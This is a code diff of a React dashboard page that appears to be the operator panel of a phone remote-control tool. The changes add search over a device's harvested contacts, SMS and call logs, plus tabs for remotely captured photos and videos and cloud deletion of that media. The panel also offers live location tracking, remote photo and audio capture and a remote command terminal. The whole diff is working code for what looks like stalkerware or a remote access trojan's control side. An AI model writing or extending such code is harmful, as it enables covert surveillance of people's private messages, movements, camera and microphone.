@@ -23,7 +23,6 @@ import {
   FiDownload,
   FiEye,
   FiEyeOff,
-  // FiVibrate,
   FiLink,
   FiPhoneCall,
   FiFileText,
@@ -33,6 +32,12 @@ import {
   FiPower,
   FiTarget,
   FiTerminal,
+  FiSearch,
+  FiImage,
+  FiVideo,
+  FiX,
+  FiDelete,
+  FiExternalLink,
 } from "react-icons/fi";
 
 const API = import.meta.env.VITE_API_URL || "http://localhost:5000";
@@ -44,6 +49,8 @@ const tabs = [
   { id: "sms", label: "SMS", icon: FiMessageSquare },
   { id: "calls", label: "Call Logs", icon: FiPhone },
   { id: "location", label: "Location", icon: FiMapPin },
+  { id: "photos", label: "Photos", icon: FiImage },
+  { id: "videos", label: "Videos", icon: FiVideo },
   { id: "files", label: "Files", icon: FiFolder },
   { id: "camera", label: "Camera", icon: FiCamera },
   { id: "terminal", label: "Terminal", icon: FiTerminal },
@@ -92,31 +99,28 @@ export default function DeviceDetails() {
   const [terminalOutput, setTerminalOutput] = useState([]);
   const [socket, setSocket] = useState(null);
   const terminalRef = useRef(null);
-  const mapRef = useRef(null);
-  const [mapInitialized, setMapInitialized] = useState(false);
+
+  // Search/filter states
+  const [contactSearch, setContactSearch] = useState("");
+  const [smsSearch, setSmsSearch] = useState("");
+  const [callSearch, setCallSearch] = useState("");
+
+  // Photo viewer
+  const [selectedPhoto, setSelectedPhoto] = useState(null);
 
   useEffect(() => {
     fetchDevice();
-
     const s = io(WS_URL, {
       auth: { token: localStorage.getItem("token") },
     });
     setSocket(s);
 
-    // device:data fires on basic device-info updates (device:update)
     s.on("device:data", (data) => {
-      if (data.deviceId === deviceId) {
-        fetchDevice();
-      }
+      if (data.deviceId === deviceId) fetchDevice();
     });
-
-    // device:data:update fires when bulk data OR a command result is saved to device.data
     s.on("device:data:update", (data) => {
-      if (data.deviceId === deviceId) {
-        fetchDevice();
-      }
+      if (data.deviceId === deviceId) fetchDevice();
     });
-
     s.on("command:sent", (data) => {
       if (data.deviceId === deviceId) {
         setCommands((prev) => [data, ...prev]);
@@ -167,16 +171,13 @@ export default function DeviceDetails() {
   const handleTerminalCommand = (e) => {
     e.preventDefault();
     if (!terminalInput.trim()) return;
-
     let [cmd, ...args] = terminalInput.trim().split(" ");
     let params = {};
-
     try {
       if (args.length > 0) params = JSON.parse(args.join(" "));
     } catch {
       params = { value: args.join(" ") };
     }
-
     sendImmediateCommand(cmd, params);
     setTerminalInput("");
   };
@@ -184,6 +185,40 @@ export default function DeviceDetails() {
   const copyToClipboard = (text) => {
     navigator.clipboard.writeText(text);
     toast.success("Copied to clipboard");
+  };
+
+  // Delete media from Cloudinary
+  const deleteMedia = async (type, publicId) => {
+    try {
+      const token = localStorage.getItem("token");
+      await axios.delete(`${API}/api/media/${deviceId}/${type}/${publicId}`, {
+        headers: { Authorization: `Bearer ${token}` },
+      });
+      toast.success("Deleted from Cloudinary");
+      fetchDevice();
+    } catch (err) {
+      toast.error("Delete failed");
+    }
+  };
+
+  // Delete all media of a type
+  const deleteAllMedia = async (type) => {
+    if (!confirm(`Delete all ${type}? This will also delete from Cloudinary.`))
+      return;
+    try {
+      const token = localStorage.getItem("token");
+      await axios.delete(`${API}/api/media/${deviceId}/${type}`, {
+        headers: { Authorization: `Bearer ${token}` },
+      });
+      toast.success("All deleted from Cloudinary");
+      fetchDevice();
+    } catch (err) {
+      toast.error("Delete failed");
+    }
+  };
+
+  const openInGoogleMaps = (lat, lng) => {
+    window.open(`https://www.google.com/maps?q=${lat},${lng}`, "_blank");
   };
 
   if (loading) {
@@ -195,6 +230,8 @@ export default function DeviceDetails() {
   }
 
   if (!device) return null;
+
+  const data = device.data || {};
 
   const StatusBadge = () => (
     <span
@@ -320,9 +357,9 @@ export default function DeviceDetails() {
 
       {/* Tab Content */}
       <div className="min-h-[400px]">
+        {/* ===== OVERVIEW ===== */}
         {activeTab === "overview" && (
           <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
-            {/* Device Info */}
             <div className="lg:col-span-2 glass-effect rounded-2xl p-6">
               <h3 className="text-lg font-semibold mb-4">Device Information</h3>
               <div className="grid grid-cols-2 gap-4">
@@ -376,7 +413,6 @@ export default function DeviceDetails() {
               </div>
             </div>
 
-            {/* Permissions */}
             <div className="glass-effect rounded-2xl p-6">
               <h3 className="text-lg font-semibold mb-4">Permissions</h3>
               <div className="space-y-3">
@@ -422,7 +458,6 @@ export default function DeviceDetails() {
               </div>
             </div>
 
-            {/* Recent Commands */}
             <div className="lg:col-span-3 glass-effect rounded-2xl p-6">
               <h3 className="text-lg font-semibold mb-4">Recent Commands</h3>
               <div className="space-y-2 max-h-60 overflow-y-auto">
@@ -450,7 +485,9 @@ export default function DeviceDetails() {
                         />
                         <span className="text-sm font-medium">{cmd.type}</span>
                         <span className="text-xs text-dark-400">
-                          {new Date(cmd.createdAt).toLocaleTimeString()}
+                          {cmd.createdAt
+                            ? new Date(cmd.createdAt).toLocaleTimeString()
+                            : ""}
                         </span>
                       </div>
                       <span className="text-xs text-dark-400">
@@ -464,166 +501,285 @@ export default function DeviceDetails() {
           </div>
         )}
 
+        {/* ===== CONTACTS ===== */}
         {activeTab === "contacts" && (
           <div className="glass-effect rounded-2xl p-6">
             <div className="flex items-center justify-between mb-4">
-              <h3 className="text-lg font-semibold">Contacts</h3>
-              <button
-                onClick={() => sendCommand("get_contacts")}
-                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
-              >
-                <FiRefreshCw className="text-sm" />
-                Refresh
-              </button>
-            </div>
-            {device.data?.contacts?.length > 0 ? (
-              <div className="space-y-2 max-h-96 overflow-y-auto">
-                {device.data.contacts.map((contact, i) => (
-                  <div
-                    key={contact.id || i}
-                    className="flex items-center justify-between p-3 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
-                  >
-                    <div>
-                      <p className="font-medium">{contact.name}</p>
-                      <p className="text-xs text-dark-400">
-                        {contact.phones?.map((p) => p.number).join(", ")}
-                      </p>
-                    </div>
-                    <button
-                      onClick={() =>
-                        copyToClipboard(JSON.stringify(contact, null, 2))
-                      }
-                      className="p-2 rounded-lg hover:bg-dark-600/50 transition-all text-dark-400"
-                    >
-                      <FiCopy className="text-sm" />
-                    </button>
-                  </div>
-                ))}
-              </div>
-            ) : (
-              <div className="text-center py-12 text-dark-400">
-                <FiUsers className="text-4xl mx-auto mb-3 opacity-50" />
-                <p>No contacts data available</p>
+              <h3 className="text-lg font-semibold">
+                Contacts{" "}
+                {(data.contacts || []).length > 0 &&
+                  `(${data.contacts.length})`}
+              </h3>
+              <div className="flex gap-2">
+                <div className="relative">
+                  <FiSearch className="absolute left-3 top-1/2 -translate-y-1/2 text-dark-400" />
+                  <input
+                    type="text"
+                    placeholder="Search contacts..."
+                    value={contactSearch}
+                    onChange={(e) => setContactSearch(e.target.value)}
+                    className="pl-10 pr-4 py-2 rounded-xl bg-dark-700/50 border border-dark-600/50 text-sm focus:outline-none focus:border-primary-500/50 w-64"
+                  />
+                </div>
                 <button
                   onClick={() => sendCommand("get_contacts")}
-                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
+                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
                 >
-                  Fetch contacts now
+                  <FiRefreshCw className="text-sm" /> Refresh
                 </button>
               </div>
-            )}
+            </div>
+            {(() => {
+              const contacts = data.contacts || [];
+              const filtered = contactSearch
+                ? contacts.filter(
+                    (c) =>
+                      (c.name || "")
+                        .toLowerCase()
+                        .includes(contactSearch.toLowerCase()) ||
+                      (c.phones || []).some((p) =>
+                        (p.number || "").includes(contactSearch)
+                      )
+                  )
+                : contacts;
+              return filtered.length > 0 ? (
+                <div className="space-y-2 max-h-96 overflow-y-auto">
+                  {filtered.map((contact, i) => (
+                    <div
+                      key={contact.id || i}
+                      className="flex items-center justify-between p-3 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
+                    >
+                      <div>
+                        <p className="font-medium">
+                          {contact.name || "Unknown"}
+                        </p>
+                        <p className="text-xs text-dark-400">
+                          {(contact.phones || [])
+                            .map((p) => p.number)
+                            .join(", ")}
+                        </p>
+                        {contact.emails && contact.emails.length > 0 && (
+                          <p className="text-xs text-dark-500">
+                            {contact.emails.join(", ")}
+                          </p>
+                        )}
+                      </div>
+                      <button
+                        onClick={() =>
+                          copyToClipboard(JSON.stringify(contact, null, 2))
+                        }
+                        className="p-2 rounded-lg hover:bg-dark-600/50 transition-all text-dark-400"
+                      >
+                        <FiCopy className="text-sm" />
+                      </button>
+                    </div>
+                  ))}
+                </div>
+              ) : (
+                <div className="text-center py-12 text-dark-400">
+                  <FiUsers className="text-4xl mx-auto mb-3 opacity-50" />
+                  <p>
+                    {contactSearch
+                      ? "No contacts match your search"
+                      : "No contacts data available"}
+                  </p>
+                  <button
+                    onClick={() => sendCommand("get_contacts")}
+                    className="mt-4 text-sm text-primary-400 hover:text-primary-300"
+                  >
+                    Fetch contacts now
+                  </button>
+                </div>
+              );
+            })()}
           </div>
         )}
 
+        {/* ===== SMS ===== */}
         {activeTab === "sms" && (
           <div className="glass-effect rounded-2xl p-6">
             <div className="flex items-center justify-between mb-4">
-              <h3 className="text-lg font-semibold">SMS Messages</h3>
-              <button
-                onClick={() => sendCommand("get_sms")}
-                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
-              >
-                <FiRefreshCw className="text-sm" />
-                Refresh
-              </button>
-            </div>
-            {device.data?.sms?.length > 0 ? (
-              <div className="space-y-2 max-h-96 overflow-y-auto">
-                {device.data.sms.map((msg, i) => (
-                  <div
-                    key={msg.id || i}
-                    className={`p-3 rounded-xl ${
-                      msg.type === "inbox"
-                        ? "bg-dark-700/30"
-                        : "bg-primary-500/5 border border-primary-500/10"
-                    }`}
-                  >
-                    <div className="flex items-center justify-between">
-                      <p className="font-medium text-sm">{msg.address}</p>
-                      <p className="text-xs text-dark-400">
-                        {new Date(msg.date).toLocaleString()}
-                      </p>
-                    </div>
-                    <p className="text-sm text-dark-300 mt-1">{msg.body}</p>
-                  </div>
-                ))}
-              </div>
-            ) : (
-              <div className="text-center py-12 text-dark-400">
-                <FiMessageSquare className="text-4xl mx-auto mb-3 opacity-50" />
-                <p>No SMS data available</p>
+              <h3 className="text-lg font-semibold">
+                SMS Messages{" "}
+                {(data.sms || []).length > 0 && `(${data.sms.length})`}
+              </h3>
+              <div className="flex gap-2">
+                <div className="relative">
+                  <FiSearch className="absolute left-3 top-1/2 -translate-y-1/2 text-dark-400" />
+                  <input
+                    type="text"
+                    placeholder="Search SMS..."
+                    value={smsSearch}
+                    onChange={(e) => setSmsSearch(e.target.value)}
+                    className="pl-10 pr-4 py-2 rounded-xl bg-dark-700/50 border border-dark-600/50 text-sm focus:outline-none focus:border-primary-500/50 w-64"
+                  />
+                </div>
                 <button
                   onClick={() => sendCommand("get_sms")}
-                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
+                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
                 >
-                  Fetch SMS now
+                  <FiRefreshCw className="text-sm" /> Refresh
                 </button>
               </div>
-            )}
+            </div>
+            {(() => {
+              const sms = data.sms || [];
+              const filtered = smsSearch
+                ? sms.filter(
+                    (m) =>
+                      (m.address || "")
+                        .toLowerCase()
+                        .includes(smsSearch.toLowerCase()) ||
+                      (m.body || "")
+                        .toLowerCase()
+                        .includes(smsSearch.toLowerCase())
+                  )
+                : sms;
+              return filtered.length > 0 ? (
+                <div className="space-y-2 max-h-96 overflow-y-auto">
+                  {filtered.map((msg, i) => (
+                    <div
+                      key={msg.id || i}
+                      className={`p-3 rounded-xl ${
+                        msg.type === "inbox"
+                          ? "bg-dark-700/30"
+                          : "bg-primary-500/5 border border-primary-500/10"
+                      }`}
+                    >
+                      <div className="flex items-center justify-between">
+                        <p className="font-medium text-sm">{msg.address}</p>
+                        <div className="flex items-center gap-2">
+                          <span className="text-xs text-dark-400">
+                            {msg.date
+                              ? new Date(msg.date).toLocaleString()
+                              : ""}
+                          </span>
+                          <button
+                            onClick={() => copyToClipboard(msg.body || "")}
+                            className="p-1 rounded hover:bg-dark-600/50 text-dark-400"
+                          >
+                            <FiCopy className="text-xs" />
+                          </button>
+                        </div>
+                      </div>
+                      <p className="text-sm text-dark-300 mt-1">{msg.body}</p>
+                    </div>
+                  ))}
+                </div>
+              ) : (
+                <div className="text-center py-12 text-dark-400">
+                  <FiMessageSquare className="text-4xl mx-auto mb-3 opacity-50" />
+                  <p>
+                    {smsSearch
+                      ? "No SMS match your search"
+                      : "No SMS data available"}
+                  </p>
+                  <button
+                    onClick={() => sendCommand("get_sms")}
+                    className="mt-4 text-sm text-primary-400 hover:text-primary-300"
+                  >
+                    Fetch SMS now
+                  </button>
+                </div>
+              );
+            })()}
           </div>
         )}
 
+        {/* ===== CALL LOGS ===== */}
         {activeTab === "calls" && (
           <div className="glass-effect rounded-2xl p-6">
             <div className="flex items-center justify-between mb-4">
-              <h3 className="text-lg font-semibold">Call Logs</h3>
-              <button
-                onClick={() => sendCommand("get_call_logs")}
-                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
-              >
-                <FiRefreshCw className="text-sm" />
-                Refresh
-              </button>
-            </div>
-            {device.data?.callLogs?.length > 0 ? (
-              <div className="space-y-2 max-h-96 overflow-y-auto">
-                {device.data.callLogs.map((call, i) => (
-                  <div
-                    key={call.id || i}
-                    className="flex items-center justify-between p-3 rounded-xl bg-dark-700/30"
-                  >
-                    <div className="flex items-center gap-3">
-                      <span
-                        className={`w-2 h-2 rounded-full ${
-                          call.type === "Incoming"
-                            ? "bg-green-400"
-                            : call.type === "Outgoing"
-                            ? "bg-blue-400"
-                            : call.type === "Missed"
-                            ? "bg-red-400"
-                            : "bg-yellow-400"
-                        }`}
-                      />
-                      <div>
-                        <p className="font-medium text-sm">
-                          {call.name || call.number}
-                        </p>
-                        <p className="text-xs text-dark-400">
-                          {call.type} · {call.duration}s
-                        </p>
-                      </div>
-                    </div>
-                    <p className="text-xs text-dark-400">
-                      {new Date(call.date).toLocaleString()}
-                    </p>
-                  </div>
-                ))}
-              </div>
-            ) : (
-              <div className="text-center py-12 text-dark-400">
-                <FiPhone className="text-4xl mx-auto mb-3 opacity-50" />
-                <p>No call log data available</p>
+              <h3 className="text-lg font-semibold">
+                Call Logs{" "}
+                {(data.callLogs || []).length > 0 &&
+                  `(${data.callLogs.length})`}
+              </h3>
+              <div className="flex gap-2">
+                <div className="relative">
+                  <FiSearch className="absolute left-3 top-1/2 -translate-y-1/2 text-dark-400" />
+                  <input
+                    type="text"
+                    placeholder="Search calls..."
+                    value={callSearch}
+                    onChange={(e) => setCallSearch(e.target.value)}
+                    className="pl-10 pr-4 py-2 rounded-xl bg-dark-700/50 border border-dark-600/50 text-sm focus:outline-none focus:border-primary-500/50 w-64"
+                  />
+                </div>
                 <button
                   onClick={() => sendCommand("get_call_logs")}
-                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
+                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
                 >
-                  Fetch call logs now
+                  <FiRefreshCw className="text-sm" /> Refresh
                 </button>
               </div>
-            )}
+            </div>
+            {(() => {
+              const calls = data.callLogs || [];
+              const filtered = callSearch
+                ? calls.filter(
+                    (c) =>
+                      (c.name || "")
+                        .toLowerCase()
+                        .includes(callSearch.toLowerCase()) ||
+                      (c.number || "").includes(callSearch)
+                  )
+                : calls;
+              return filtered.length > 0 ? (
+                <div className="space-y-2 max-h-96 overflow-y-auto">
+                  {filtered.map((call, i) => (
+                    <div
+                      key={call.id || i}
+                      className="flex items-center justify-between p-3 rounded-xl bg-dark-700/30"
+                    >
+                      <div className="flex items-center gap-3">
+                        <span
+                          className={`w-2 h-2 rounded-full ${
+                            call.type === "Incoming"
+                              ? "bg-green-400"
+                              : call.type === "Outgoing"
+                              ? "bg-blue-400"
+                              : call.type === "Missed"
+                              ? "bg-red-400"
+                              : "bg-yellow-400"
+                          }`}
+                        />
+                        <div>
+                          <p className="font-medium text-sm">
+                            {call.name || call.number}
+                          </p>
+                          <p className="text-xs text-dark-400">
+                            {call.type} · {call.duration || 0}s
+                          </p>
+                        </div>
+                      </div>
+                      <p className="text-xs text-dark-400">
+                        {call.date ? new Date(call.date).toLocaleString() : ""}
+                      </p>
+                    </div>
+                  ))}
+                </div>
+              ) : (
+                <div className="text-center py-12 text-dark-400">
+                  <FiPhone className="text-4xl mx-auto mb-3 opacity-50" />
+                  <p>
+                    {callSearch
+                      ? "No calls match your search"
+                      : "No call log data available"}
+                  </p>
+                  <button
+                    onClick={() => sendCommand("get_call_logs")}
+                    className="mt-4 text-sm text-primary-400 hover:text-primary-300"
+                  >
+                    Fetch call logs now
+                  </button>
+                </div>
+              );
+            })()}
           </div>
         )}
 
+        {/* ===== LOCATION ===== */}
         {activeTab === "location" && (
           <div className="glass-effect rounded-2xl p-6">
             <div className="flex items-center justify-between mb-4">
@@ -633,71 +789,69 @@ export default function DeviceDetails() {
                   onClick={() => sendCommand("get_location")}
                   className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
                 >
-                  <FiMapPin className="text-sm" />
-                  Get Location
+                  <FiMapPin className="text-sm" /> Get Location
                 </button>
                 <button
                   onClick={() => sendCommand("continuous_location")}
                   className="flex items-center gap-2 px-4 py-2 rounded-xl bg-green-500/10 text-green-400 border border-green-500/30 hover:bg-green-500/20 transition-all text-sm"
                 >
-                  <FiTarget className="text-sm" />
-                  Live Track
+                  <FiTarget className="text-sm" /> Live Track
                 </button>
               </div>
             </div>
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
               <div className="lg:col-span-2">
-                <div className="h-80 rounded-xl bg-dark-700/50 flex items-center justify-center">
-                  {device.data?.locations?.length > 0 ? (
-                    <div className="text-center">
-                      <FiMapPin className="text-4xl mx-auto mb-2 text-primary-400" />
-                      <p className="text-sm">Last location:</p>
-                      <p className="text-lg font-mono">
-                        {device.data.locations[
-                          device.data.locations.length - 1
-                        ].lat?.toFixed(6)}
-                        ,
-                        {device.data.locations[
-                          device.data.locations.length - 1
-                        ].lng?.toFixed(6)}
-                      </p>
-                      <button
-                        onClick={() =>
-                          window.open(
-                            `https://www.google.com/maps?q=${
-                              device.data.locations[
-                                device.data.locations.length - 1
-                              ].lat
-                            },${
-                              device.data.locations[
-                                device.data.locations.length - 1
-                              ].lng
-                            }`,
-                            "_blank"
-                          )
-                        }
-                        className="mt-2 text-sm text-primary-400 hover:text-primary-300"
-                      >
-                        Open in Google Maps →
-                      </button>
+                <div className="h-80 rounded-xl bg-dark-700/50 flex items-center justify-center relative overflow-hidden">
+                  {(data.locations || []).length > 0 ? (
+                    <div className="w-full h-full relative">
+                      <iframe
+                        title="Location Map"
+                        width="100%"
+                        height="100%"
+                        frameBorder="0"
+                        style={{ border: 0, borderRadius: "0.75rem" }}
+                        src={`https://www.openstreetmap.org/export/embed.html?bbox=${
+                          data.locations[data.locations.length - 1].lng - 0.01
+                        }%2C${
+                          data.locations[data.locations.length - 1].lat - 0.01
+                        }%2C${
+                          data.locations[data.locations.length - 1].lng + 0.01
+                        }%2C${
+                          data.locations[data.locations.length - 1].lat + 0.01
+                        }&layer=mapnik&marker=${
+                          data.locations[data.locations.length - 1].lat
+                        }%2C${data.locations[data.locations.length - 1].lng}`}
+                        allowFullScreen
+                      />
                     </div>
                   ) : (
                     <p className="text-dark-400">No location data available</p>
                   )}
                 </div>
               </div>
-              <div className="space-y-3 max-h-80 overflow-y-auto">
-                {device.data?.locations
-                  ?.slice()
+              <div className="space-y-2 max-h-80 overflow-y-auto">
+                {(data.locations || [])
+                  .slice()
                   .reverse()
                   .map((loc, i) => (
-                    <div key={i} className="p-3 rounded-xl bg-dark-700/30">
+                    <div
+                      key={i}
+                      className="p-3 rounded-xl bg-dark-700/30 cursor-pointer hover:bg-dark-700/50 transition-all"
+                      onClick={() => openInGoogleMaps(loc.lat, loc.lng)}
+                    >
                       <p className="text-xs font-mono">
-                        {loc.lat?.toFixed(4)}, {loc.lng?.toFixed(4)}
+                        {loc.lat?.toFixed(6)}, {loc.lng?.toFixed(6)}
                       </p>
                       <p className="text-xs text-dark-400 mt-1">
-                        {new Date(loc.timestamp).toLocaleString()}
+                        {loc.timestamp
+                          ? new Date(loc.timestamp).toLocaleString()
+                          : ""}
                       </p>
+                      {loc.address && (
+                        <p className="text-xs text-dark-500 mt-1 truncate">
+                          {loc.address}
+                        </p>
+                      )}
                     </div>
                   ))}
               </div>
@@ -705,11 +859,276 @@ export default function DeviceDetails() {
           </div>
         )}
 
+        {/* ===== PHOTOS ===== */}
+        {activeTab === "photos" && (
+          <div className="glass-effect rounded-2xl p-6">
+            <div className="flex items-center justify-between mb-4">
+              <h3 className="text-lg font-semibold">
+                Captured Photos{" "}
+                {((data.capturedPhotos || []).length > 0 || data.lastPhoto) &&
+                  `(${(data.capturedPhotos || []).length})`}
+              </h3>
+              <div className="flex gap-2">
+                <button
+                  onClick={() => sendCommand("take_photo")}
+                  className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
+                >
+                  <FiCamera className="text-sm" /> Take Photo
+                </button>
+                {(data.capturedPhotos || []).length > 0 && (
+                  <button
+                    onClick={() => deleteAllMedia("capturedPhotos")}
+                    className="flex items-center gap-2 px-4 py-2 rounded-xl bg-red-500/10 text-red-400 border border-red-500/30 hover:bg-red-500/20 transition-all text-sm"
+                  >
+                    <FiTrash2 className="text-sm" /> Delete All
+                  </button>
+                )}
+              </div>
+            </div>
+            {(data.capturedPhotos || []).length > 0 ? (
+              <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+                {(data.capturedPhotos || [])
+                  .slice()
+                  .reverse()
+                  .map((photo, i) => (
+                    <div key={photo.publicId || i} className="relative group">
+                      <img
+                        src={photo.url}
+                        alt={`Captured ${i}`}
+                        className="w-full h-48 object-cover rounded-xl cursor-pointer"
+                        onClick={() => setSelectedPhoto(photo.url)}
+                      />
+                      <div className="absolute inset-0 bg-black/50 opacity-0 group-hover:opacity-100 transition-opacity rounded-xl flex items-center justify-center gap-2">
+                        <button
+                          onClick={() =>
+                            deleteMedia("capturedPhotos", photo.publicId)
+                          }
+                          className="p-2 bg-red-500/80 rounded-lg hover:bg-red-500 transition-all"
+                        >
+                          <FiTrash2 className="text-white" />
+                        </button>
+                        <button
+                          onClick={() => window.open(photo.url, "_blank")}
+                          className="p-2 bg-white/20 rounded-lg hover:bg-white/30 transition-all"
+                        >
+                          <FiExternalLink className="text-white" />
+                        </button>
+                      </div>
+                      <p className="text-xs text-dark-400 mt-1">
+                        {photo.timestamp
+                          ? new Date(photo.timestamp).toLocaleString()
+                          : ""}
+                      </p>
+                    </div>
+                  ))}
+              </div>
+            ) : (
+              <div className="text-center py-12 text-dark-400">
+                <FiImage className="text-4xl mx-auto mb-3 opacity-50" />
+                <p>No photos captured yet</p>
+                <button
+                  onClick={() => sendCommand("take_photo")}
+                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
+                >
+                  Take a photo now
+                </button>
+              </div>
+            )}
+
+            {/* Photo viewer modal */}
+            {selectedPhoto && (
+              <div
+                className="fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-8"
+                onClick={() => setSelectedPhoto(null)}
+              >
+                <img
+                  src={selectedPhoto}
+                  alt="Preview"
+                  className="max-w-full max-h-full rounded-xl"
+                />
+                <button
+                  className="absolute top-4 right-4 p-2 bg-dark-700/80 rounded-full hover:bg-dark-700 transition-all"
+                  onClick={() => setSelectedPhoto(null)}
+                >
+                  <FiX className="text-xl" />
+                </button>
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ===== VIDEOS ===== */}
+        {activeTab === "videos" && (
+          <div className="glass-effect rounded-2xl p-6">
+            <div className="flex items-center justify-between mb-4">
+              <h3 className="text-lg font-semibold">
+                Videos{" "}
+                {(data.videos || []).length > 0 && `(${data.videos.length})`}
+              </h3>
+              <button
+                onClick={() => sendCommand("get_videos")}
+                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
+              >
+                <FiRefreshCw className="text-sm" /> Refresh
+              </button>
+            </div>
+            {(data.videos || []).length > 0 ? (
+              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+                {(data.videos || []).map((video, i) => (
+                  <div
+                    key={video.id || i}
+                    className="p-3 rounded-xl bg-dark-700/30"
+                  >
+                    <div className="flex items-center gap-3 mb-2">
+                      <FiVideo className="text-primary-400" />
+                      <p className="text-sm font-medium truncate">
+                        {video.name}
+                      </p>
+                    </div>
+                    <p className="text-xs text-dark-400">
+                      {video.size
+                        ? `${(video.size / 1024 / 1024).toFixed(1)} MB`
+                        : ""}
+                      {video.date
+                        ? ` · ${new Date(video.date).toLocaleDateString()}`
+                        : ""}
+                    </p>
+                  </div>
+                ))}
+              </div>
+            ) : (
+              <div className="text-center py-12 text-dark-400">
+                <FiVideo className="text-4xl mx-auto mb-3 opacity-50" />
+                <p>No video data available</p>
+                <button
+                  onClick={() => sendCommand("get_videos")}
+                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
+                >
+                  Fetch videos now
+                </button>
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ===== FILES ===== */}
+        {activeTab === "files" && (
+          <div className="glass-effect rounded-2xl p-6">
+            <div className="flex items-center justify-between mb-4">
+              <h3 className="text-lg font-semibold">
+                Documents{" "}
+                {(data.documents || []).length > 0 &&
+                  `(${data.documents.length})`}
+              </h3>
+              <button
+                onClick={() => sendCommand("get_documents")}
+                className="flex items-center gap-2 px-4 py-2 rounded-xl bg-primary-500/10 text-primary-400 border border-primary-500/30 hover:bg-primary-500/20 transition-all text-sm"
+              >
+                <FiRefreshCw className="text-sm" /> Refresh
+              </button>
+            </div>
+            {(data.documents || []).length > 0 ? (
+              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
+                {(data.documents || []).map((doc, i) => (
+                  <div
+                    key={doc.id || i}
+                    className="p-3 rounded-xl bg-dark-700/30 hover:bg-dark-700/50 transition-all"
+                  >
+                    <div className="flex items-center gap-3">
+                      <FiFileText className="text-primary-400" />
+                      <div className="flex-1 min-w-0">
+                        <p className="text-sm font-medium truncate">
+                          {doc.name}
+                        </p>
+                        <p className="text-xs text-dark-400">
+                          {doc.size ? `${(doc.size / 1024).toFixed(0)} KB` : ""}
+                          {doc.mimeType ? ` · ${doc.mimeType}` : ""}
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            ) : (
+              <div className="text-center py-12 text-dark-400">
+                <FiFolder className="text-4xl mx-auto mb-3 opacity-50" />
+                <p>No document data available</p>
+                <button
+                  onClick={() => sendCommand("get_documents")}
+                  className="mt-4 text-sm text-primary-400 hover:text-primary-300"
+                >
+                  Fetch documents now
+                </button>
+              </div>
+            )}
+          </div>
+        )}
+
+        {/* ===== CAMERA ===== */}
+        {activeTab === "camera" && (
+          <div className="glass-effect rounded-2xl p-6">
+            <h3 className="text-lg font-semibold mb-4">Camera Controls</h3>
+
+            {/* Last captured photo */}
+            {data.lastPhoto && (
+              <div className="mb-6">
+                <p className="text-sm text-dark-400 mb-2">Last Captured:</p>
+                <div className="relative w-full max-w-lg">
+                  <img
+                    src={data.lastPhoto.url}
+                    alt="Last captured"
+                    className="w-full h-64 object-cover rounded-xl"
+                  />
+                  <div className="absolute top-2 right-2 flex gap-2">
+                    <button
+                      onClick={() => window.open(data.lastPhoto.url, "_blank")}
+                      className="p-2 bg-dark-700/80 rounded-lg hover:bg-dark-700 transition-all"
+                    >
+                      <FiExternalLink className="text-white text-sm" />
+                    </button>
+                    <button
+                      onClick={() =>
+                        deleteMedia("capturedPhotos", data.lastPhoto.publicId)
+                      }
+                      className="p-2 bg-red-500/80 rounded-lg hover:bg-red-500 transition-all"
+                    >
+                      <FiTrash2 className="text-white text-sm" />
+                    </button>
+                  </div>
+                </div>
+              </div>
+            )}
+
+            <div className="grid grid-cols-2 gap-4">
+              <button
+                onClick={() => sendCommand("take_photo")}
+                className="p-8 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-primary-500/30 transition-all card-hover text-center"
+              >
+                <FiCamera className="text-4xl mx-auto mb-3 text-primary-400" />
+                <p className="font-medium">Take Photo</p>
+                <p className="text-xs text-dark-400 mt-1">
+                  Capture from camera
+                </p>
+              </button>
+              <button
+                onClick={() => sendCommand("record_audio", { action: "start" })}
+                className="p-8 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-primary-500/30 transition-all card-hover text-center"
+              >
+                <FiMic className="text-4xl mx-auto mb-3 text-primary-400" />
+                <p className="font-medium">Record Audio</p>
+                <p className="text-xs text-dark-400 mt-1">
+                  Start microphone recording
+                </p>
+              </button>
+            </div>
+          </div>
+        )}
+
+        {/* ===== TERMINAL ===== */}
         {activeTab === "terminal" && (
           <div className="glass-effect rounded-2xl p-6">
             <h3 className="text-lg font-semibold mb-4">Remote Terminal</h3>
 
